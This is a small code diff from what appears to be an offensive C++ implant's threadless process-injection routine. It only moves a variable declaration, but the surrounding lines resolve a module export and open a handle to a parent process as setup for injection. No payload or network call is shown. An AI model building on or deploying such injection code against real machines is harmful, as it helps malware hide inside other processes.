@@ -9,11 +9,11 @@ namespace Injection {
         HEXANE
 
         HANDLE Proc         = { };
-        SIZE_T Write        = 0;
         ULONG Protect       = 0;
         UINT_PTR pExport    = 0;
         UINT_PTR exportCpy  = 0;
         UINT_PTR pHook      = 0;
+        SIZE_T Write        = 0;
 
         if (!(pExport   = Memory::LdrGetExport(SCAST(LPSTR, Threadless.Module.Buffer), RCAST(LPSTR, Threadless.Export.Buffer))) ||
             !(Proc      = Process::LdrGetParentHandle(RCAST(PBYTE, Threadless.Parent.Buffer))) ||
